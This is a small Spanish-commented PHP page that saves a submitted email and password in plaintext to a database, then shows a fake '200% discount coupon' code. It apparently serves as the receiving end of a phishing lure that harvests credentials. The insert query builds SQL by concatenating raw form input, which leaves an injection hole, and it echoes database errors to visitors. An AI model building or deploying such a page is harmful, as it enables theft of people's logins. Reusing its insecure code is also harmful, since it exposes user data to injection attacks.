<!DOCTYPE html>
<html>
<head>
	<title></title>
	<link rel="icon" type="logo/ico" href="logo.ico">
</head>
<style type="text/css">
	html, body{height: 100%; width: 100%; margin: 0 auto;}
</style>
<body>

<?php 
/*conexión de la base de datos del servidor*/

$user = "root";
$pass = "";
$host = "localhost";
$db   = "form";
$mysqli = mysqli_connect($host,$user,$pass,$db);

/*conexión de la base de datos del servidor*/

/*verifica si esta conectado correctamente */

if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}

/*verifica si esta conectado correctamente */


/*recibe las variables enviadas por el formulario, verifica si existen y las asignas a las variables indicadas */
$correo="";
$contrasena="";

if(isset($_POST['E-mail'])){
   $correo=$_POST['E-mail'];
}

if(isset($_POST['contrasena'])){
	$contrasena=$_POST['contrasena'];
}


/*recibe las variables enviadas por el formulario, verifica si existen y las asignas a las variables indicadas */

//codigo sql para agregar un nuevo dat a la table cliente
$sql = "INSERT INTO cliente ( email, contraseña)
VALUES ('".$correo."', '".$contrasena."')";


/* ejecuta la consulta y verifica si se efectuo correctamente */
if ($mysqli->query($sql) === TRUE) {
  echo "";
} else {
 echo "Error: " . $sql . "<br>" . $mysqli->error;
}



 
 ?>


<img src="imag.jpeg" style="width: 100%; height: 60%">
<p style="font-size: 30px; font-weight: bold; text-align: center; font-family:Proxima Nova,-apple-system,Helvetica Neue,Helvetica,Roboto,Arial,sans-serif;">¡Excelente!</p>
<p style="font-size: 25px;  text-align: center; font-family:Proxima Nova,-apple-system,Helvetica Neue,Helvetica,Roboto,Arial,sans-serif;">¡Ya puedes aprovechar tu cupon de descuento de 200% con el siguente codigo 145346!</p>


</body>
</html>